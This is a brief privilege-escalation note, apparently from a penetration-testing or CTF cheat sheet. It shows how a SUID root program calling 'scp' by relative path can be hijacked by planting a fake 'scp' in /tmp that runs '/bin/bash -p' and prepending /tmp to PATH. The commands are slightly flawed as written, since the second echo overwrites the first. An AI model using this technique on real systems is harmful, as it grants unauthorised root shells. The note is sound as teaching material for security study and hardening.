# Relative Path in SUID Program

```
-rwsr-xr-x  1 root root  10K 1970-01-01 00:01 secureprogram
$ cat secureprogram

scp -r file/secured/* 10.10.10.10:/var/www/......
```

Using relative path for program! It should be as /usr/bin/scp. That is, we can manipulate it by adding the path variable.

```
$ cd /tmp

$ echo "#\!/bin/sh" > scp
$ echo "/bin/bash -p" > scp

$ export PATH=/tmp:$PATH

secureprogram
```
